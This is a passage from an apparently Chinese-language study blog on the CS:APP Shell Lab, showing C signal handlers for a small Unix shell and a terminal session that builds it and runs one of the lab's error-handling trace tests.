</span><span id=__span-150-10><a id=__codelineno-150-10 name=__codelineno-150-10></a><span class=w>    </span><span class=kt>int</span><span class=w> </span><span class=n>olderrno</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>errno</span><span class=p>;</span><span class=w>    </span><span class=c1>// 由于errno是全局变量, 注意保存和恢复errno</span>
</span><span id=__span-150-11><a id=__codelineno-150-11 name=__codelineno-150-11></a><span class=w>    </span><span class=kt>int</span><span class=w> </span><span class=n>status</span><span class=p>;</span>
</span><span id=__span-150-12><a id=__codelineno-150-12 name=__codelineno-150-12></a><span class=w>    </span><span class=kt>pid_t</span><span class=w> </span><span class=n>pid</span><span class=p>;</span>
</span><span id=__span-150-13><a id=__codelineno-150-13 name=__codelineno-150-13></a><span class=w>    </span><span class=k>struct</span><span class=w> </span><span class=nc>job_t</span><span class=w> </span><span class=o>*</span><span class=n>job</span><span class=p>;</span>
</span><span id=__span-150-14><a id=__codelineno-150-14 name=__codelineno-150-14></a><span class=w>    </span><span class=kt>sigset_t</span><span class=w> </span><span class=n>mask</span><span class=p>,</span><span class=w> </span><span class=n>prev</span><span class=p>;</span>
</span><span id=__span-150-15><a id=__codelineno-150-15 name=__codelineno-150-15></a><span class=w>    </span><span class=n>sigfillset</span><span class=p>(</span><span class=o>&amp;</span><span class=n>mask</span><span class=p>);</span>
</span><span id=__span-150-16><a id=__codelineno-150-16 name=__codelineno-150-16></a><span class=w>    </span><span class=k>while</span><span class=w> </span><span class=p>((</span><span class=n>pid</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>waitpid</span><span class=p>(</span><span class=mi>-1</span><span class=p>,</span><span class=w> </span><span class=o>&amp;</span><span class=n>status</span><span class=p>,</span><span class=w> </span><span class=n>WNOHANG</span><span class=w> </span><span class=o>|</span><span class=w> </span><span class=n>WUNTRACED</span><span class=p>))</span><span class=w> </span><span class=o>&gt;</span><span class=w> </span><span class=mi>0</span><span class=p>)</span><span class=w> </span><span class=c1>// 获取任何子进程的状态变化, -1: 等待任何子进程</span>
</span><span id=__span-150-17><a id=__codelineno-150-17 name=__codelineno-150-17></a><span class=w>    </span><span class=p>{</span><span class=w> </span><span class=c1>// WNOHANG：非阻塞模式，没有状态变化的子进程时立即返回; WUNTRACED：同时检查终止和停止的子进程</span>
</span><span id=__span-150-18><a id=__codelineno-150-18 name=__codelineno-150-18></a><span class=w>        </span><span class=n>sigprocmask</span><span class=p>(</span><span class=n>SIG_BLOCK</span><span class=p>,</span><span class=w> </span><span class=o>&amp;</span><span class=n>mask</span><span class=p>,</span><span class=w> </span><span class=o>&amp;</span><span class=n>prev</span><span class=p>);</span><span class=w>   </span><span class=c1>// 阻塞所有信号</span>
</span><span id=__span-150-19><a id=__codelineno-150-19 name=__codelineno-150-19></a><span class=w>        </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>WIFEXITED</span><span class=p>(</span><span class=n>status</span><span class=p>))</span><span class=w>                  </span><span class=c1>// 正常终止，即子进程通过 exit() 或 return 正常退出</span>
</span><span id=__span-150-20><a id=__codelineno-150-20 name=__codelineno-150-20></a><span class=w>        </span><span class=p>{</span><span class=w>                 </span>
</span><span id=__span-150-21><a id=__codelineno-150-21 name=__codelineno-150-21></a><span class=w>            </span><span class=n>deletejob</span><span class=p>(</span><span class=n>jobs</span><span class=p>,</span><span class=w> </span><span class=n>pid</span><span class=p>);</span>
</span><span id=__span-150-22><a id=__codelineno-150-22 name=__codelineno-150-22></a><span class=w>        </span><span class=p>}</span>
</span><span id=__span-150-23><a id=__codelineno-150-23 name=__codelineno-150-23></a><span class=w>        </span><span class=k>else</span><span class=w> </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>WIFSIGNALED</span><span class=p>(</span><span class=n>status</span><span class=p>))</span><span class=w>           </span><span class=c1>// 信号终止, 打印（如 Ctrl+C 发送的 SIGINT）</span>
</span><span id=__span-150-24><a id=__codelineno-150-24 name=__codelineno-150-24></a><span class=w>        </span><span class=p>{</span><span class=w>          </span>
</span><span id=__span-150-25><a id=__codelineno-150-25 name=__codelineno-150-25></a><span class=w>            </span><span class=n>printf</span><span class=w> </span><span class=p>(</span><span class=s>"Job [%d] (%d) terminated by signal %d</span><span class=se>\n</span><span class=s>"</span><span class=p>,</span><span class=w> </span><span class=n>pid2jid</span><span class=p>(</span><span class=n>pid</span><span class=p>),</span><span class=w> </span><span class=n>pid</span><span class=p>,</span><span class=w> </span><span class=n>WTERMSIG</span><span class=p>(</span><span class=n>status</span><span class=p>));</span>
</span><span id=__span-150-26><a id=__codelineno-150-26 name=__codelineno-150-26></a><span class=w>            </span><span class=n>deletejob</span><span class=p>(</span><span class=n>jobs</span><span class=p>,</span><span class=w> </span><span class=n>pid</span><span class=p>);</span>
</span><span id=__span-150-27><a id=__codelineno-150-27 name=__codelineno-150-27></a><span class=w>        </span><span class=p>}</span>
</span><span id=__span-150-28><a id=__codelineno-150-28 name=__codelineno-150-28></a><span class=w>        </span><span class=k>else</span><span class=w> </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>WIFSTOPPED</span><span class=p>(</span><span class=n>status</span><span class=p>))</span><span class=w>            </span><span class=c1>// 进程停止, 打印（如 Ctrl+Z 发送的 SIGTSTP）</span>
</span><span id=__span-150-29><a id=__codelineno-150-29 name=__codelineno-150-29></a><span class=w>        </span><span class=p>{</span><span class=w>           </span>
</span><span id=__span-150-30><a id=__codelineno-150-30 name=__codelineno-150-30></a><span class=w>            </span><span class=n>printf</span><span class=w> </span><span class=p>(</span><span class=s>"Job [%d] (%d) stoped by signal %d</span><span class=se>\n</span><span class=s>"</span><span class=p>,</span><span class=w> </span><span class=n>pid2jid</span><span class=p>(</span><span class=n>pid</span><span class=p>),</span><span class=w> </span><span class=n>pid</span><span class=p>,</span><span class=w> </span><span class=n>WSTOPSIG</span><span class=p>(</span><span class=n>status</span><span class=p>));</span>
</span><span id=__span-150-31><a id=__codelineno-150-31 name=__codelineno-150-31></a><span class=w>            </span><span class=n>job</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>getjobpid</span><span class=p>(</span><span class=n>jobs</span><span class=p>,</span><span class=w> </span><span class=n>pid</span><span class=p>);</span>
</span><span id=__span-150-32><a id=__codelineno-150-32 name=__codelineno-150-32></a><span class=w>            </span><span class=n>job</span><span class=o>-&gt;</span><span class=n>state</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>ST</span><span class=p>;</span><span class=w>                    </span><span class=c1>// 进程处于暂停状态，只是被挂起，后续可以使用`fg %作业号`或`bg %作业号`恢复到前台/后台执行</span>
</span><span id=__span-150-33><a id=__codelineno-150-33 name=__codelineno-150-33></a><span class=w>        </span><span class=p>}</span>
</span><span id=__span-150-34><a id=__codelineno-150-34 name=__codelineno-150-34></a><span class=w>        </span><span class=n>sigprocmask</span><span class=p>(</span><span class=n>SIG_SETMASK</span><span class=p>,</span><span class=w> </span><span class=o>&amp;</span><span class=n>prev</span><span class=p>,</span><span class=w> </span><span class=nb>NULL</span><span class=p>);</span><span class=w>          </span>
</span><span id=__span-150-35><a id=__codelineno-150-35 name=__codelineno-150-35></a><span class=w>    </span><span class=p>}</span>
</span><span id=__span-150-36><a id=__codelineno-150-36 name=__codelineno-150-36></a><span class=w>    </span><span class=n>errno</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>olderrno</span><span class=p>;</span>
</span><span id=__span-150-37><a id=__codelineno-150-37 name=__codelineno-150-37></a><span class=w>    </span><span class=k>return</span><span class=p>;</span>
</span><span id=__span-150-38><a id=__codelineno-150-38 name=__codelineno-150-38></a><span class=p>}</span>
</span></code></pre></div></td></tr></table></div> <p>实现一个 SIGINT 信号处理函数，将信号传送给前台进程:</p> <div class="language-C highlight"><table class=highlighttable><tr><td class=linenos><div class=linenodiv><pre><span></span><span class=normal><a href=#__codelineno-151-1> 1</a></span>
<span class=normal><a href=#__codelineno-151-2> 2</a></span>
<span class=normal><a href=#__codelineno-151-3> 3</a></span>
<span class=normal><a href=#__codelineno-151-4> 4</a></span>
<span class=normal><a href=#__codelineno-151-5> 5</a></span>
<span class=normal><a href=#__codelineno-151-6> 6</a></span>
<span class=normal><a href=#__codelineno-151-7> 7</a></span>
<span class=normal><a href=#__codelineno-151-8> 8</a></span>
<span class=normal><a href=#__codelineno-151-9> 9</a></span>
<span class=normal><a href=#__codelineno-151-10>10</a></span>
<span class=normal><a href=#__codelineno-151-11>11</a></span>
<span class=normal><a href=#__codelineno-151-12>12</a></span>
<span class=normal><a href=#__codelineno-151-13>13</a></span>
<span class=normal><a href=#__codelineno-151-14>14</a></span>
<span class=normal><a href=#__codelineno-151-15>15</a></span>
<span class=normal><a href=#__codelineno-151-16>16</a></span>
<span class=normal><a href=#__codelineno-151-17>17</a></span>
<span class=normal><a href=#__codelineno-151-18>18</a></span>
<span class=normal><a href=#__codelineno-151-19>19</a></span>
<span class=normal><a href=#__codelineno-151-20>20</a></span></pre></div></td><td class=code><div><pre><span></span><code><span id=__span-151-1><a id=__codelineno-151-1 name=__codelineno-151-1></a><span class=cm>/* </span>
</span><span id=__span-151-2><a id=__codelineno-151-2 name=__codelineno-151-2></a><span class=cm>* sigint_handler - The kernel sends a SIGINT to the shell whenver the</span>
</span><span id=__span-151-3><a id=__codelineno-151-3 name=__codelineno-151-3></a><span class=cm>*    user types ctrl-c at the keyboard.  Catch it and send it along</span>
</span><span id=__span-151-4><a id=__codelineno-151-4 name=__codelineno-151-4></a><span class=cm>*    to the foreground job.  </span>
</span><span id=__span-151-5><a id=__codelineno-151-5 name=__codelineno-151-5></a><span class=cm>*/</span>
</span><span id=__span-151-6><a id=__codelineno-151-6 name=__codelineno-151-6></a><span class=kt>void</span><span class=w> </span><span class=nf>sigint_handler</span><span class=p>(</span><span class=kt>int</span><span class=w> </span><span class=n>sig</span><span class=p>)</span><span class=w> </span>
</span><span id=__span-151-7><a id=__codelineno-151-7 name=__codelineno-151-7></a><span class=p>{</span>
</span><span id=__span-151-8><a id=__codelineno-151-8 name=__codelineno-151-8></a><span class=w>    </span><span class=kt>int</span><span class=w> </span><span class=n>olderrno</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>errno</span><span class=p>;</span>
</span><span id=__span-151-9><a id=__codelineno-151-9 name=__codelineno-151-9></a><span class=w>    </span><span class=kt>int</span><span class=w> </span><span class=n>pid</span><span class=p>;</span>
</span><span id=__span-151-10><a id=__codelineno-151-10 name=__codelineno-151-10></a><span class=w>    </span><span class=kt>sigset_t</span><span class=w> </span><span class=n>mask_all</span><span class=p>,</span><span class=w> </span><span class=n>prev</span><span class=p>;</span>
</span><span id=__span-151-11><a id=__codelineno-151-11 name=__codelineno-151-11></a><span class=w>    </span><span class=n>Sigfillset</span><span class=p>(</span><span class=o>&amp;</span><span class=n>mask_all</span><span class=p>);</span>
</span><span id=__span-151-12><a id=__codelineno-151-12 name=__codelineno-151-12></a><span class=w>    </span><span class=n>Sigprocmask</span><span class=p>(</span><span class=n>SIG_BLOCK</span><span class=p>,</span><span class=w> </span><span class=o>&amp;</span><span class=n>mask_all</span><span class=p>,</span><span class=w> </span><span class=o>&amp;</span><span class=n>prev</span><span class=p>);</span>
</span><span id=__span-151-13><a id=__codelineno-151-13 name=__codelineno-151-13></a><span class=w>    </span><span class=k>if</span><span class=w> </span><span class=p>((</span><span class=n>pid</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>fgpid</span><span class=p>(</span><span class=n>jobs</span><span class=p>))</span><span class=w> </span><span class=o>!=</span><span class=w> </span><span class=mi>0</span><span class=p>)</span><span class=w> </span><span class=c1>// 获取当前前台作业的进程组ID</span>
</span><span id=__span-151-14><a id=__codelineno-151-14 name=__codelineno-151-14></a><span class=w>    </span><span class=p>{</span>
</span><span id=__span-151-15><a id=__codelineno-151-15 name=__codelineno-151-15></a><span class=w>        </span><span class=n>Sigprocmask</span><span class=p>(</span><span class=n>SIG_SETMASK</span><span class=p>,</span><span class=w> </span><span class=o>&amp;</span><span class=n>prev</span><span class=p>,</span><span class=w> </span><span class=nb>NULL</span><span class=p>);</span>
</span><span id=__span-151-16><a id=__codelineno-151-16 name=__codelineno-151-16></a><span class=w>        </span><span class=n>Kill</span><span class=p>(</span><span class=o>-</span><span class=n>pid</span><span class=p>,</span><span class=w> </span><span class=n>SIGINT</span><span class=p>);</span><span class=w>       </span><span class=c1>// 向整个前台进程组发送SIGINT信号，负号表示整个进程组</span>
</span><span id=__span-151-17><a id=__codelineno-151-17 name=__codelineno-151-17></a><span class=w>    </span><span class=p>}</span>
</span><span id=__span-151-18><a id=__codelineno-151-18 name=__codelineno-151-18></a><span class=w>    </span><span class=n>errno</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>olderrno</span><span class=p>;</span>
</span><span id=__span-151-19><a id=__codelineno-151-19 name=__codelineno-151-19></a><span class=w>    </span><span class=k>return</span><span class=p>;</span>
</span><span id=__span-151-20><a id=__codelineno-151-20 name=__codelineno-151-20></a><span class=p>}</span>
</span></code></pre></div></td></tr></table></div> <p>实现一个 SIGSTOP 信号处理函数，将信号传送给前台进程：</p> <div class="language-C highlight"><table class=highlighttable><tr><td class=linenos><div class=linenodiv><pre><span></span><span class=normal><a href=#__codelineno-152-1> 1</a></span>
<span class=normal><a href=#__codelineno-152-2> 2</a></span>
<span class=normal><a href=#__codelineno-152-3> 3</a></span>
<span class=normal><a href=#__codelineno-152-4> 4</a></span>
<span class=normal><a href=#__codelineno-152-5> 5</a></span>
<span class=normal><a href=#__codelineno-152-6> 6</a></span>
<span class=normal><a href=#__codelineno-152-7> 7</a></span>
<span class=normal><a href=#__codelineno-152-8> 8</a></span>
<span class=normal><a href=#__codelineno-152-9> 9</a></span>
<span class=normal><a href=#__codelineno-152-10>10</a></span>
<span class=normal><a href=#__codelineno-152-11>11</a></span>
<span class=normal><a href=#__codelineno-152-12>12</a></span>
<span class=normal><a href=#__codelineno-152-13>13</a></span>
<span class=normal><a href=#__codelineno-152-14>14</a></span>
<span class=normal><a href=#__codelineno-152-15>15</a></span>
<span class=normal><a href=#__codelineno-152-16>16</a></span>
<span class=normal><a href=#__codelineno-152-17>17</a></span>
<span class=normal><a href=#__codelineno-152-18>18</a></span>
<span class=normal><a href=#__codelineno-152-19>19</a></span>
<span class=normal><a href=#__codelineno-152-20>20</a></span></pre></div></td><td class=code><div><pre><span></span><code><span id=__span-152-1><a id=__codelineno-152-1 name=__codelineno-152-1></a><span class=cm>/*</span>
</span><span id=__span-152-2><a id=__codelineno-152-2 name=__codelineno-152-2></a><span class=cm>* sigtstp_handler - The kernel sends a SIGTSTP to the shell whenever</span>
</span><span id=__span-152-3><a id=__codelineno-152-3 name=__codelineno-152-3></a><span class=cm>*     the user types ctrl-z at the keyboard. Catch it and suspend the</span>
</span><span id=__span-152-4><a id=__codelineno-152-4 name=__codelineno-152-4></a><span class=cm>*     foreground job by sending it a SIGTSTP.  </span>
</span><span id=__span-152-5><a id=__codelineno-152-5 name=__codelineno-152-5></a><span class=cm>*/</span>
</span><span id=__span-152-6><a id=__codelineno-152-6 name=__codelineno-152-6></a><span class=kt>void</span><span class=w> </span><span class=nf>sigtstp_handler</span><span class=p>(</span><span class=kt>int</span><span class=w> </span><span class=n>sig</span><span class=p>)</span><span class=w> </span>
</span><span id=__span-152-7><a id=__codelineno-152-7 name=__codelineno-152-7></a><span class=p>{</span>
</span><span id=__span-152-8><a id=__codelineno-152-8 name=__codelineno-152-8></a><span class=w>    </span><span class=kt>int</span><span class=w> </span><span class=n>olderrno</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>errno</span><span class=p>;</span>
</span><span id=__span-152-9><a id=__codelineno-152-9 name=__codelineno-152-9></a><span class=w>    </span><span class=kt>int</span><span class=w> </span><span class=n>pid</span><span class=p>;</span>
</span><span id=__span-152-10><a id=__codelineno-152-10 name=__codelineno-152-10></a><span class=w>    </span><span class=kt>sigset_t</span><span class=w> </span><span class=n>mask_all</span><span class=p>,</span><span class=w> </span><span class=n>prev</span><span class=p>;</span>
</span><span id=__span-152-11><a id=__codelineno-152-11 name=__codelineno-152-11></a><span class=w>    </span><span class=n>Sigfillset</span><span class=p>(</span><span class=o>&amp;</span><span class=n>mask_all</span><span class=p>);</span>
</span><span id=__span-152-12><a id=__codelineno-152-12 name=__codelineno-152-12></a><span class=w>    </span><span class=n>Sigprocmask</span><span class=p>(</span><span class=n>SIG_BLOCK</span><span class=p>,</span><span class=w> </span><span class=o>&amp;</span><span class=n>mask_all</span><span class=p>,</span><span class=w> </span><span class=o>&amp;</span><span class=n>prev</span><span class=p>);</span>
</span><span id=__span-152-13><a id=__codelineno-152-13 name=__codelineno-152-13></a><span class=w>    </span><span class=k>if</span><span class=w> </span><span class=p>((</span><span class=n>pid</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>fgpid</span><span class=p>(</span><span class=n>jobs</span><span class=p>))</span><span class=w> </span><span class=o>&gt;</span><span class=w> </span><span class=mi>0</span><span class=p>)</span>
</span><span id=__span-152-14><a id=__codelineno-152-14 name=__codelineno-152-14></a><span class=w>    </span><span class=p>{</span>
</span><span id=__span-152-15><a id=__codelineno-152-15 name=__codelineno-152-15></a><span class=w>        </span><span class=n>Sigprocmask</span><span class=p>(</span><span class=n>SIG_SETMASK</span><span class=p>,</span><span class=w> </span><span class=o>&amp;</span><span class=n>prev</span><span class=p>,</span><span class=w> </span><span class=nb>NULL</span><span class=p>);</span>
</span><span id=__span-152-16><a id=__codelineno-152-16 name=__codelineno-152-16></a><span class=w>        </span><span class=n>Kill</span><span class=p>(</span><span class=o>-</span><span class=n>pid</span><span class=p>,</span><span class=w> </span><span class=n>SIGSTOP</span><span class=p>);</span>
</span><span id=__span-152-17><a id=__codelineno-152-17 name=__codelineno-152-17></a><span class=w>    </span><span class=p>}</span>
</span><span id=__span-152-18><a id=__codelineno-152-18 name=__codelineno-152-18></a><span class=w>    </span><span class=n>errno</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>olderrno</span><span class=p>;</span>
</span><span id=__span-152-19><a id=__codelineno-152-19 name=__codelineno-152-19></a><span class=w>    </span><span class=k>return</span><span class=p>;</span>
</span><span id=__span-152-20><a id=__codelineno-152-20 name=__codelineno-152-20></a><span class=p>}</span>
</span></code></pre></div></td></tr></table></div> </li> <li> <h3 id=tsh>tsh 测试<a class=headerlink href=#tsh title="Permanent link">¶</a></h3> <p>实验文件还包括了作者制作的参考 tsh，以及 16 个测试用例，通过跑用例查看结果与参考 tsh 是否相同，就能判断我们写的 tsh 有无问题：</p> <div class="language-bash highlight"><table class=highlighttable><tr><td class=linenos><div class=linenodiv><pre><span></span><span class=normal><a href=#__codelineno-153-1> 1</a></span>
<span class=normal><a href=#__codelineno-153-2> 2</a></span>
<span class=normal><a href=#__codelineno-153-3> 3</a></span>
<span class=normal><a href=#__codelineno-153-4> 4</a></span>
<span class=normal><a href=#__codelineno-153-5> 5</a></span>
<span class=normal><a href=#__codelineno-153-6> 6</a></span>
<span class=normal><a href=#__codelineno-153-7> 7</a></span>
<span class=normal><a href=#__codelineno-153-8> 8</a></span>
<span class=normal><a href=#__codelineno-153-9> 9</a></span>
<span class=normal><a href=#__codelineno-153-10>10</a></span>
<span class=normal><a href=#__codelineno-153-11>11</a></span>
<span class=normal><a href=#__codelineno-153-12>12</a></span>
<span class=normal><a href=#__codelineno-153-13>13</a></span>
<span class=normal><a href=#__codelineno-153-14>14</a></span>
<span class=normal><a href=#__codelineno-153-15>15</a></span>
<span class=normal><a href=#__codelineno-153-16>16</a></span>
<span class=normal><a href=#__codelineno-153-17>17</a></span>
<span class=normal><a href=#__codelineno-153-18>18</a></span>
<span class=normal><a href=#__codelineno-153-19>19</a></span>
<span class=normal><a href=#__codelineno-153-20>20</a></span>
<span class=normal><a href=#__codelineno-153-21>21</a></span>
<span class=normal><a href=#__codelineno-153-22>22</a></span>
<span class=normal><a href=#__codelineno-153-23>23</a></span>
<span class=normal><a href=#__codelineno-153-24>24</a></span>
<span class=normal><a href=#__codelineno-153-25>25</a></span>
<span class=normal><a href=#__codelineno-153-26>26</a></span>
<span class=normal><a href=#__codelineno-153-27>27</a></span>
<span class=normal><a href=#__codelineno-153-28>28</a></span>
<span class=normal><a href=#__codelineno-153-29>29</a></span>
<span class=normal><a href=#__codelineno-153-30>30</a></span>
<span class=normal><a href=#__codelineno-153-31>31</a></span>
<span class=normal><a href=#__codelineno-153-32>32</a></span>
<span class=normal><a href=#__codelineno-153-33>33</a></span>
<span class=normal><a href=#__codelineno-153-34>34</a></span>
<span class=normal><a href=#__codelineno-153-35>35</a></span>
<span class=normal><a href=#__codelineno-153-36>36</a></span>
<span class=normal><a href=#__codelineno-153-37>37</a></span>
<span class=normal><a href=#__codelineno-153-38>38</a></span>
<span class=normal><a href=#__codelineno-153-39>39</a></span>
<span class=normal><a href=#__codelineno-153-40>40</a></span>
<span class=normal><a href=#__codelineno-153-41>41</a></span>
<span class=normal><a href=#__codelineno-153-42>42</a></span>
<span class=normal><a href=#__codelineno-153-43>43</a></span>
<span class=normal><a href=#__codelineno-153-44>44</a></span>
<span class=normal><a href=#__codelineno-153-45>45</a></span>
<span class=normal><a href=#__codelineno-153-46>46</a></span>
<span class=normal><a href=#__codelineno-153-47>47</a></span>
<span class=normal><a href=#__codelineno-153-48>48</a></span>
<span class=normal><a href=#__codelineno-153-49>49</a></span>
<span class=normal><a href=#__codelineno-153-50>50</a></span>
<span class=normal><a href=#__codelineno-153-51>51</a></span>
<span class=normal><a href=#__codelineno-153-52>52</a></span>
<span class=normal><a href=#__codelineno-153-53>53</a></span>
<span class=normal><a href=#__codelineno-153-54>54</a></span>
<span class=normal><a href=#__codelineno-153-55>55</a></span>
<span class=normal><a href=#__codelineno-153-56>56</a></span>
<span class=normal><a href=#__codelineno-153-57>57</a></span>
<span class=normal><a href=#__codelineno-153-58>58</a></span>
<span class=normal><a href=#__codelineno-153-59>59</a></span>
<span class=normal><a href=#__codelineno-153-60>60</a></span>
<span class=normal><a href=#__codelineno-153-61>61</a></span>
<span class=normal><a href=#__codelineno-153-62>62</a></span>
<span class=normal><a href=#__codelineno-153-63>63</a></span>
<span class=normal><a href=#__codelineno-153-64>64</a></span>
<span class=normal><a href=#__codelineno-153-65>65</a></span>
<span class=normal><a href=#__codelineno-153-66>66</a></span>
<span class=normal><a href=#__codelineno-153-67>67</a></span>
<span class=normal><a href=#__codelineno-153-68>68</a></span>
<span class=normal><a href=#__codelineno-153-69>69</a></span></pre></div></td><td class=code><div><pre><span></span><code><span id=__span-153-1><a id=__codelineno-153-1 name=__codelineno-153-1></a><span class=m>07</span>-Shell-Lab$<span class=w> </span>make<span class=w> </span>clean<span class=w> </span><span class=o>&amp;&amp;</span><span class=w> </span>make<span class=w> </span>all
</span><span id=__span-153-2><a id=__codelineno-153-2 name=__codelineno-153-2></a>rm<span class=w> </span>-f<span class=w> </span>./tsh<span class=w> </span>./myspin<span class=w> </span>./mysplit<span class=w> </span>./mystop<span class=w> </span>./myint<span class=w> </span>*.o<span class=w> </span>*~
</span><span id=__span-153-3><a id=__codelineno-153-3 name=__codelineno-153-3></a>gcc<span class=w> </span>-Wall<span class=w> </span>-O2<span class=w>    </span>tsh.c<span class=w>   </span>-o<span class=w> </span>tsh
</span><span id=__span-153-4><a id=__codelineno-153-4 name=__codelineno-153-4></a>gcc<span class=w> </span>-Wall<span class=w> </span>-O2<span class=w>    </span>myspin.c<span class=w>   </span>-o<span class=w> </span>myspin
</span><span id=__span-153-5><a id=__codelineno-153-5 name=__codelineno-153-5></a>gcc<span class=w> </span>-Wall<span class=w> </span>-O2<span class=w>    </span>mysplit.c<span class=w>   </span>-o<span class=w> </span>mysplit
</span><span id=__span-153-6><a id=__codelineno-153-6 name=__codelineno-153-6></a>gcc<span class=w> </span>-Wall<span class=w> </span>-O2<span class=w>    </span>mystop.c<span class=w>   </span>-o<span class=w> </span>mystop
</span><span id=__span-153-7><a id=__codelineno-153-7 name=__codelineno-153-7></a>gcc<span class=w> </span>-Wall<span class=w> </span>-O2<span class=w>    </span>myint.c<span class=w>   </span>-o<span class=w> </span>myint
</span><span id=__span-153-8><a id=__codelineno-153-8 name=__codelineno-153-8></a><span class=m>07</span>-Shell-Lab$<span class=w> </span>make<span class=w> </span>test14
</span><span id=__span-153-9><a id=__codelineno-153-9 name=__codelineno-153-9></a>./sdriver.pl<span class=w> </span>-t<span class=w> </span>trace14.txt<span class=w> </span>-s<span class=w> </span>./tsh<span class=w> </span>-a<span class=w> </span><span class=s2>"-p"</span>
</span><span id=__span-153-10><a id=__codelineno-153-10 name=__codelineno-153-10></a><span class=c1>#</span>
</span><span id=__span-153-11><a id=__codelineno-153-11 name=__codelineno-153-11></a><span class=c1># trace14.txt - Simple error handling</span>
</span><span id=__span-153-12><a id=__codelineno-153-12 name=__codelineno-153-12></a><span class=c1>#</span>
</span><span id=__span-153-13><a id=__codelineno-153-13 name=__codelineno-153-13></a>tsh&gt;<span class=w> </span>./bogus
</span><span id=__span-153-14><a id=__codelineno-153-14 name=__codelineno-153-14></a>./bogus:<span class=w> </span>Command<span class=w> </span>not<span class=w> </span>found.
</span><span id=__span-153-15><a id=__codelineno-153-15 name=__codelineno-153-15></a>tsh&gt;<span class=w> </span>./myspin<span class=w> </span><span class=m>4</span><span class=w> </span><span class=p>&amp;</span>
</span><span id=__span-153-16><a id=__codelineno-153-16 name=__codelineno-153-16></a><span class=o>[</span><span class=m>1</span><span class=o>]</span><span class=w> </span><span class=o>(</span><span class=m>743488</span><span class=o>)</span><span class=w> </span>./myspin<span class=w> </span><span class=m>4</span><span class=w> </span><span class=p>&amp;</span>
</span><span id=__span-153-17><a id=__codelineno-153-17 name=__codelineno-153-17></a>tsh&gt;<span class=w> </span><span class=nb>fg</span>
</span><span id=__span-153-18><a id=__codelineno-153-18 name=__codelineno-153-18></a><span class=nb>fg</span><span class=w> </span><span class=nb>command</span><span class=w> </span>requires<span class=w> </span>PID<span class=w> </span>or<span class=w> </span>%jobid<span class=w> </span>argument
</span><span id=__span-153-19><a id=__codelineno-153-19 name=__codelineno-153-19></a>tsh&gt;<span class=w> </span><span class=nb>bg</span>
</span><span id=__span-153-20><a id=__codelineno-153-20 name=__codelineno-153-20></a><span class=nb>bg</span><span class=w> </span><span class=nb>command</span><span class=w> </span>requires<span class=w> </span>PID<span class=w> </span>or<span class=w> </span>%jobid<span class=w> </span>argument
</span><span id=__span-153-21><a id=__codelineno-153-21 name=__codelineno-153-21></a>tsh&gt;<span class=w> </span><span class=nb>fg</span><span class=w> </span>a
</span><span id=__span-153-22><a id=__codelineno-153-22 name=__codelineno-153-22></a>fg:<span class=w> </span>argument<span class=w> </span>must<span class=w> </span>be<span class=w> </span>a<span class=w> </span>PID<span class=w> </span>or<span class=w> </span>%jobid
</span><span id=__span-153-23><a id=__codelineno-153-23 name=__codelineno-153-23></a>tsh&gt;<span class=w> </span><span class=nb>bg</span><span class=w> </span>a
</span><span id=__span-153-24><a id=__codelineno-153-24 name=__codelineno-153-24></a>bg:<span class=w> </span>argument<span class=w> </span>must<span class=w> </span>be<span class=w> </span>a<span class=w> </span>PID<span class=w> </span>or<span class=w> </span>%jobid
</span><span id=__span-153-25><a id=__codelineno-153-25 name=__codelineno-153-25></a>tsh&gt;<span class=w> </span><span class=nb>fg</span><span class=w> </span><span class=m>9999999</span>
</span><span id=__span-153-26><a id=__codelineno-153-26 name=__codelineno-153-26></a><span class=o>(</span><span class=m>9999999</span><span class=o>)</span>:<span class=w> </span>No<span class=w> </span>such<span class=w> </span>process
</span><span id=__span-153-27><a id=__codelineno-153-27 name=__codelineno-153-27></a>tsh&gt;<span class=w> </span><span class=nb>bg</span><span class=w> </span><span class=m>9999999</span>
</span><span id=__span-153-28><a id=__codelineno-153-28 name=__codelineno-153-28></a><span class=o>(</span><span class=m>9999999</span><span class=o>)</span>:<span class=w> </span>No<span class=w> </span>such<span class=w> </span>process
</span><span id=__span-153-29><a id=__codelineno-153-29 name=__codelineno-153-29></a>tsh&gt;<span class=w> </span><span class=nb>fg</span><span class=w> </span>%2
</span><span id=__span-153-30><a id=__codelineno-153-30 name=__codelineno-153-30></a>%2:<span class=w> </span>No<span class=w> </span>such<span class=w> </span>job
</span><span id=__span-153-31><a id=__codelineno-153-31 name=__codelineno-153-31></a>tsh&gt;<span class=w> </span><span class=nb>fg</span><span class=w> </span>%1
</span><span id=__span-153-32><a id=__codelineno-153-32 name=__codelineno-153-32></a>Job<span class=w> </span><span class=o>[</span><span class=m>1</span><span class=o>]</span><span class=w> </span><span class=o>(</span><span class=m>743488</span><span class=o>)</span><span class=w> </span>stoped<span class=w> </span>by<span class=w> </span>signal<span class=w> </span><span class=m>19</span>
</span><span id=__span-153-33><a id=__codelineno-153-33 name=__codelineno-153-33></a>tsh&gt;<span class=w> </span><span class=nb>bg</span><span class=w> </span>%2
</span><span id=__span-153-34><a id=__codelineno-153-34 name=__codelineno-153-34></a>%2:<span class=w> </span>No<span class=w> </span>such<span class=w> </span>job
</span><span id=__span-153-35><a id=__codelineno-153-35 name=__codelineno-153-35></a>tsh&gt;<span class=w> </span><span class=nb>bg</span><span class=w> </span>%1
</span><span id=__span-153-36><a id=__codelineno-153-36 name=__codelineno-153-36></a><span class=o>[</span><span class=m>1</span><span class=o>]</span><span class=w> </span><span class=o>(</span><span class=m>743488</span><span class=o>)</span><span class=w> </span>./myspin<span class=w> </span><span class=m>4</span><span class=w> </span><span class=p>&amp;</span>
</span><span id=__span-153-37><a id=__codelineno-153-37 name=__codelineno-153-37></a>tsh&gt;<span class=w> </span><span class=nb>jobs</span>
